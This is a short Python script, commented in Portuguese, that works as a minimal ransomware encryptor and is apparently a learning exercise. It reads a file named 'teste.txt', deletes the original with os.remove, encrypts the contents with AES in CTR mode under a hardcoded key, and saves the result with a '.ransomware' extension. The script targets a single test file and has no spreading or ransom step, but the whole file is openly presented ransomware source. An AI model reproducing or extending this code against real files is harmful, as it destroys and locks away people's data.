
# Importando as Bibliotecas
import os
import pyaes

# Abrir o arquivo a ser criptografado
file_name = 'teste.txt'
file = open(file_name, 'rb')
file_data = file.read()

# Remover o arquivo original
os.remove(file_name)

# Definir a chave de encriptacao
key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

# Criptgrafar o arquivo
crypt_data = aes.encrypt(file_data)

# Salvar o arquivo criptografado
new_file = file_name + '.ransomware'
new_file = open(f'{new_file}','wb')
new_file.write(crypt_data)
new_file.close()
